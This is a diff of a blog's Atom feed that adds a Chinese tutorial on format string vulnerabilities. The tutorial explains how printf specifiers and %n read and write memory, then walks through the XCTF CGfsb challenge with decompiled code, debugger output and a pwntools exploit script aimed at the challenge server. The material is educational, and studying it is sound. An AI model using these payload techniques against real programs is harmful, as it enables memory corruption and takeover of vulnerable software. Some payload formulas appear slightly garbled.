@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-23T13:03:45.666Z</updated>
+  <updated>2019-07-27T06:36:43.561Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>格式化字符串漏洞</title>
+    <link href="http://yoursite.com/2019/07/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2019/07/27/格式化字符串漏洞/</id>
+    <published>2019-07-27T03:07:49.808Z</published>
+    <updated>2019-07-27T06:36:43.561Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><blockquote><h2 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="- 格式化字符串漏洞基本原理"></a>- 格式化字符串漏洞基本原理</h2><p>格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。介绍格式化字符串原理的文章有很多，我这里就以printf函数为例，简单回顾其中的要点。</p></blockquote><hr><p>printf()函数的一般形式为printf(“format”, 输出表列)，</p><p>其第一个参数就是格式化字符串，用来告诉程序以什么格式进行输出。</p><p>正常情况下，我们是这样使用的：</p><pre><code>char str[100];scanf(&quot;%s&quot;,str);printf(&quot;%s&quot;,str);</code></pre><p>但也会有人这么用：</p><pre><code>char str[100];scanf(&quot;%s&quot;,str);printf(str)</code></pre><p>也许代码编写者的本意只是单纯打印一段字符（如“hello world”），但如果这段</p><p>字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式</p><p>化字符(如%s）。那么，由于printf允许参数个数不固定，故printf会自动将这段</p><p>字符当作format参数，而用其后内存中的数据匹配format参数。</p><p><img src="https://p3.ssl.qhimg.com/t0163bde2c444318577.png" alt=""></p><p>以上图为例，假设调用printf(str)时的栈是这样的。</p><p>1）如str就是“hello world”，则直接输出“hello world”；</p><p>2）如str是format，比如是%2$x，则输出偏移2处的16进制数据0xdeadbeef。</p><p>通过组合变换格式化字符串参数，我们可以读取任意偏移处的数据或向任意偏</p><p>移处写数据，从而达到利用格式化字符串漏洞的作用。</p><hr><h2 id="2-基本的格式化字符串参数"><a href="#2-基本的格式化字符串参数" class="headerlink" title="2.基本的格式化字符串参数"></a>2.基本的格式化字符串参数</h2><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><hr><h1 id="格式化字符串漏洞payload构造"><a href="#格式化字符串漏洞payload构造" class="headerlink" title="格式化字符串漏洞payload构造"></a>格式化字符串漏洞payload构造</h1><ul><li><p>格式化字符串漏洞可以手工构造payload戒者使用pwntools中的FmtStr。为了防<br>止写入数据太多出现错误，通常会使用%hhn来写。</p></li><li><p>32位下的格式化字符串较容易构造，令offset为执行call printf时栈顶距输<br>入开头的偏移，换算成参数个数表示(即32位除以4,64位除以8)，address为要<br>被改写的地址，data为要被改写的数据，一个基础的payload可以以如下公<br>式表示</p></li></ul><p>[address]%[data-4]c%[offset]$n</p><p>改写成%hhn的话为</p><p>[address][address+1][address+2][address+3]%[data[0]-16]c%[offset]hhn%[(data[1]-data[0]-<br>16)]c%[offset+1]$hhn%[(data[2]-data[1]-data[0]-16)]c%[offset+2]$hhn%[(data[3]-data[2]-data[1]-data[0]-<br>16)]c%[offset+1]$hhn </p><p>其中%和c间的数字如果为负，则加0x100至发为正数。</p><p>使用fmtstr_payload生成的话，其参数为fmtstr_payload(offset, {address:data}, numbwritten=0, </p><p>write_size=’byte’)，前三个参数丌再解释，第四个参数numbwritten表示在返个payload前写入的字节数，第五个参数write_size控制时%n, %hn迓是%hhn</p><ul><li>需要注意的是printf凼数族是字符串处理凼数，会被\x00截断，由亍64位下地址头部几乎必然有0，因此64位的<br>payload无法使用fmtstr_payload生成，手工构造时必项把地址放在payload最后以确保payload完整。</li></ul><ul><li><p>例题</p></li><li></li><li><p>XCTF CGfsb<br>=<br>查看为32位文件<br>拖入IDA</p><p>  int __cdecl main(int argc, const char *<em>argv, const char *</em>envp)<br>  {</p><pre><code>int buf; // [esp+1Eh] [ebp-7Eh]int v5; // [esp+22h] [ebp-7Ah]__int16 v6; // [esp+26h] [ebp-76h]char s; // [esp+28h] [ebp-74h]unsigned int v8; // [esp+8Ch] [ebp-10h]v8 = __readgsdword(0x14u);setbuf(stdin, 0);setbuf(stdout, 0);setbuf(stderr, 0);buf = 0;v5 = 0; v6 = 0;memset(&amp;s, 0, 0x64u);puts(&quot;please tell me your name:&quot;);read(0, &amp;buf, 0xAu);</code></pre><p>   puts(“leave your message please:”);</p><pre><code>fgets(&amp;s, 100, stdin);printf(&quot;hello %s&quot;, &amp;buf);puts(&quot;your message is:&quot;);</code></pre><p>   printf(&amp;s);</p><pre><code>if ( pwnme == 8 ){  puts(&quot;you pwned me, here is your flag:\n&quot;);  system(&quot;cat flag&quot;);}else{  puts(&quot;ank you!&quot;);}return 0;</code></pre><p>  }</p></li></ul><hr><p>我拿到题的思路：</p><ul><li>条件位pwn==8时输出flag</li></ul><ul><li><p>肯定找找在哪啊！</p></li><li><p>发现在.bss段,也就是未手动初始化的数据，地址是0x0804A06</p></li><li><p>小本本记下来</p></li><li><p>读取你的姓名read（）好像挺正常的~下一位！</p></li><li><p>获取你的message 一个fget函数貌似也挺正常的</p></li><li><p>然后输出buf中存的《你的名字》</p></li><li><p>再printf（&amp;s）输出你的message嘛，然后~</p></li><li><p>等等！！！这是啥！！！你怎么咩第一个参数啊？excuse me？ </p></li><li><p>格式化字符串看看传入的第一个参数的偏移</p></li><li><p>果然有</p></li><li><p>记下来偏移量</p></li><li><p>接下来~</p></li><li><p>构造payload</p></li><li><p>payload2 = (p32(pwnme) + ‘a’*4 + ‘%10$n’)  #pwnme地址占4个字节，</p></li><li><p>所以后面需要打印4个a</p></li><li><p>先是用pwnme的地址传入第一个参数的地址中，接着往pwnme中传入数据</p></li><li><p>因为p32（pwnme）是四字节所以再填里面四个a凑够长度8，然后写入pwnme中</p></li></ul><hr><pre><code>bss段（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小。data（已手动初始化的数据）段则为数据分配空间，数据保存在目标文件中。8</code></pre><p>用pwndbg调试看一下运行栈的实际情况</p><p>输入参数，name=aaaa，message=AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x</p><blockquote><p>pwndbg&gt; c</p><p>Continuing.</p></blockquote><blockquote><p>AAAA ffffcc6e f7fb45a0 00f0b6ff ffffcc9e 00000001 000000c2 </p></blockquote><blockquote><p>616126bb 000a6161 00000000 41414141 38302520 30252078</p></blockquote><blockquote><p>Thank you!</p></blockquote><blockquote><p>[Inferior 1 (process 5093) exited normally]</p></blockquote><p>可以看到第11个参数是我们输入的AAAA（0x41）</p><p>同时结合前面pwnme的地址是0x0804A068</p><p>所以payload为</p><p>\x68\xa0\x04\x08+‘a’*4+%10$n</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><pre><code>from pwn import *context.log_level = &apos;debug&apos;conn = remote(&quot;111.198.29.45&quot;,54083)pwnme = 0x0804A068payload1 = &apos;aaaa&apos;payload2 = (p32(pwnme) + &apos;a&apos;*4 + &apos;%10$n&apos;)  #pwnme地址占4个字节，所以后面需要打印4个aconn.recvuntil(&apos;please tell me your name:&apos;)conn.sendline(payload1)conn.recvuntil(&apos;leave your message please:&apos;) conn.sendline(payload2)print(conn.recvall())</code></pre><hr><ul><li>pwn调试</li></ul><p>-一个是设置context.log_level=”debug”</p><p>脚本在执行时就会输出debug的信息，你可以通过观察这些信息查找哪步出错了</p><p>用gdb.attach(p)</p><p>在发送payload前加入这条语句，同时加上pause() 时脚本暂停</p><p>然后就会弹出来一个开启gdb的终端，先在这个终端下好断点，然后回运行着脚本的</p><p>那个终端按一下回车继续运行脚本，程序就会运行到断点，就可以调试了</p><hr><p>from pwn import*<br>p = process(‘./xxxx’)<br>payload = …..<br>gdb.attach(p)<br>pause()<br>p.sendline(payload)<br>p.interactive()  </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;blockquote&gt;
+&lt;h2 id=&quot;格式化字符串漏洞基本原理&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞基本原理&quot; class=&quot;headerlink&quot; title=&quot;- 格式化字符串漏洞基本原理&quot;&gt;&lt;/a&gt;- 格式化字符串漏洞基本原理&lt;/h
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>hexo 搭建个人博客部署环节spawn failed及解决</title>
